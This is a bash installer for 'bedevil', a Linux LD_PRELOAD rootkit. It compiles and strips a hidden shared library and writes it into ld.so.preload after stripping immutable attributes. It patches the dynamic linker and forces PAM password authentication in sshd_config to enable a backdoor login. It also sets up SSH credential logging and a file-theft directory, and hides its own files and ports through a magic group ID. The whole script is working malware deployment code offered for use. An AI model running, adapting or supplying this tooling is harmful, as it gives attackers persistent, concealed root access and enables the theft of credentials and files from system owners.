#!/bin/bash

tty -s && clear
[ -f .ascii ] && printf "\e[1m\e[31m`cat .ascii`\e[0m\n"

source ./etc/util.sh
source ./etc/environ.sh
source ./etc/defaults.sh
source ./etc/toggles.sh
source ./etc/arrays.sh
source ./etc/consts.sh

get_setting(){ # $1 = var
    local var var_name input is_string \
          range_hide_ports
    var="$1"

    [[ $var == *"\""* ]] && is_string=1
    [[ $var != *"\""* ]] && is_string=0

    [ $is_string == 1 ] && input="`random 'a-z' 7`" # random text
    [ $is_string == 0 ] && input=`random '1-9' 3` # random integer

    eval "var_name=\"`printf ${var} | tr -d '\"\?,'`\""
    [ ! -z "`printf "${!var_name}"`" ] && input="${!var_name}"
    echo "$var_name = $input" >> $BDVLSO.creds

    [[ "$var_name" == *"_PORT" ]] && \
        [ `echo -n "$var_name" | awk -F"_" '{printf NF-1}'` == 2 ] && \
            range_hide_ports+=($input)
    [[ "$var_name" == *"_PORT" ]] && \
        [ `echo -n "$var_name" | awk -F"_" '{printf NF-1}'` == 1 ] && \
            HIDE_PORTS+=($input)

    [ `toggle_enabled USE_CRYPT` == "true" ] && [[ "$var_name" == *"_PWD" ]] && input="`crypt_password $input`"

    [ $is_string == 1 ] && echo -n "\"`xor $input`\":$var"
    [ $is_string == 0 ] && echo -n "$input:$var"
}

setup_header(){ # $1 = header to write to
    necho "Building & writing C char arrays for the lib headers"
    write_char_arrays >> $1

    necho "Writing background variables"
    write_consts >> $1
    echo "#endif" >> $1
}

populate_new_placeholders(){
    [ -d $NEW_MDIR ] && rm -rf $NEW_MDIR
    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory"; exit; }

    setup_header $BDVL_H
    [ `toggle_enabled HIDE_PORTS` == "true" ] && get_hide_ports

    necho "Overwriting variable placeholders with new settings"
    local var_placeholders headers settings
    var_placeholders=(`find_var_placeholders`)
    for var in ${var_placeholders[@]}; do settings+=(`get_setting "$var"`); done
    echo; while read -r line; do necho "$line"; done <<< "`cat $BDVLSO.creds`"; echo

    for ps in ${settings[@]}; do
        IFS=':' read -r var_value var_name <<< "$ps"
        headers=(`find_header_paths`)
        for header in ${headers[@]}; do sed -i "s:${var_name}:${var_value}:" $header; done
    done
}

setup_home(){
    export ${BD_VAR}=1 # set the magic environment variable so we can do stuff

    if [ -f etc/bd_bashrc ]; then
        echo '. .bashrc' > "$1/.profile" && \
        cp etc/bd_bashrc "$1/.bashrc"
    fi

    for f in ${COPY_FILES[@]}; do
        [ -f $f ] && \
        cp $f $1/`basename $f`
    done

    if [ `toggle_enabled FILE_STEAL` == "true" ]; then
        mkdir -p $INTEREST_DIR && \
        chmod 666 $INTEREST_DIR && \
        ln -s $INTEREST_DIR $1/interest_dir
    fi
    
    if [ `toggle_enabled LOG_SSH` == "true" ]; then
        touch $SSH_LOGS && \
        chmod 666 $SSH_LOGS && \
        ln -s $SSH_LOGS $1/ssh_logs
    fi

    if [ `toggle_enabled HIDE_PORTS` == "true" ]; then
        touch $HIDE_PORTS_PATH && chmod 644 $HIDE_PORTS_PATH
        for port in ${HIDE_PORTS[@]}; do echo "$port" >> $HIDE_PORTS_PATH; done
    fi

    if [ `toggle_enabled HIDE_SELF` == "true" ]; then
        local hide_files=($LDSO_PRELOAD $SSH_LOGS $INTEREST_DIR \
                          $LOGPATH $1 $1/* $1/.profile $1/.bashrc \
                          $1/.ascii)

        necho "Hiding rootkit files"
        for file in ${hide_files[@]}; do chown 0:$MAGIC_GID $file; done
    fi

    unset $BD_VAR
}

compile_bdvl(){
    [ ! -d "$NEW_MDIR" ] && { eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
    
    local warning_flags optimization_flags \
          options linker_options \
          linker_flags log_file

    warning_flags="-Wall"
    optimization_flags="-O0 -g0"
    options="-fomit-frame-pointer -fPIC"
    linker_options="-Wl,--build-id=none"
    linker_flags="-ldl"
    [ `toggle_enabled USE_CRYPT` == "true" ] && linker_flags+=" -lcrypt "
    [ `toggle_enabled ACCEPT_USE_SSL` == "true" ] && linker_flags+=" -lssl "

    log_file=$BDVLSO.log
    printf "Beginning compilation\n\n" >> $log_file
    gcc -std=gnu99 $optimization_flags $NEW_MDIR/bedevil.c $warning_flags $options \
        -I$NEW_MDIR -shared $linker_flags $linker_options -o $BDVLSO.$PLATFORM >>$log_file
    gcc -m32 -std=gnu99 $optimization_flags $NEW_MDIR/bedevil.c $warning_flags $options \
        -I$NEW_MDIR -shared $linker_flags $linker_options -o $BDVLSO.i686 &>/dev/null
    printf "\nDone" >> $log_file

    [ `cat $log_file | wc -l` != 3 ] && necho "Compilation log written to $log_file"
    [ `cat $log_file | wc -l` == 3 ] && rm $log_file

    strip -s $BDVLSO.$PLATFORM 2>/dev/null || { eecho "Couldn't strip library, exiting"; exit; }
    [ -f $BDVLSO.i686 ] && strip -s $BDVLSO.i686

    [ -f $BDVLSO.$PLATFORM ] && \
        secho "`lib_size $PLATFORM`"
    [ -f $BDVLSO.i686 ] && \
        secho "`lib_size i686`"
}

install_bdvl(){
    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root, exiting"; exit; }

    secho "Starting full installation!\n"

    read -p "`wecho "Patch dynamic linker libs? [Y/n]: "`" -n 1 -r
    [ -z $REPLY ] || [[ $REPLY =~ ^[Yy]$ ]] && patch_libdl
    echo

    read -p "`wecho "Install potential dependencies? [Y/n]: "`" -n 1 -r
    [ -z $REPLY ] || [[ $REPLY =~ ^[Yy]$ ]] && etc/install_deps.sh
    echo

    populate_new_placeholders
    build_bdvlc
    compile_bdvl

    necho "Installing to $INSTALL_DIR"
    [ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR/
    cp $BDVLSO.$PLATFORM $SOPATH
    cp $BDVLSO.i686 $INSTALL_DIR/$BDVLSO.i686 2>/dev/null

    if [ "`toggle_enabled USE_PAM_BD`" == "true" ]; then
        [ "`cat /etc/ssh/sshd_config | grep 'UsePAM'`" == "UsePAM yes" ] || \
            echo "UsePAM yes" >> /etc/ssh/sshd_config
        [ "`cat /etc/ssh/sshd_config | grep 'PasswordAuthentication yes'`" == "PasswordAuthentication yes" ] || \
            echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
    fi

    necho "Writing \$SOPATH to $LDSO_PRELOAD"
    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
    echo -n $SOPATH > $LDSO_PRELOAD
    secho "Installation finished"
    cleanup_bdvl
    echo

    setup_home $INSTALL_DIR
    secho "Installation complete"
}

HELPMSG="
  Usage: $0 [option]
      Options:
          -h: Show this help message and exit.
          -t: Go through toggles and change any you may want before
              compiling.
          -d: Populate rootkit headers with user data.
          -b: Make bedevil.c.
          -c: Compile rootkit library in current directory and exit.
          -C: Clean up installation/compilation mess and exit.
          -D: Install all potential required dependencies. (REQUIRES ROOT)
          -i: Launch full installation of bedevil. (REQUIRES ROOT)
"

while getopts "h?qtdpcCbiD" opt; do
    case "$opt" in
    h)
        echo "$HELPMSG"
        exit
        ;;
    t)
        set_toggles
        ;;
    d)  
        populate_new_placeholders
        ;;
    p)  
        start_config_wizard
        echo "${PSETTINGS[*]}" > example_config
        exit
        ;;
    c)
        compile_bdvl
        ;;
    C)
        cleanup_bdvl
        ;;
    b)
        build_bdvlc
        ;;
    i)
        install_bdvl
        exit
        ;;
    D)
        etc/install_deps.sh
        ;;
    ?)
        echo "$HELPMSG"
        exit
        ;;
    esac
done

[[ "$1" != "-"* ]] && echo "$HELPMSG"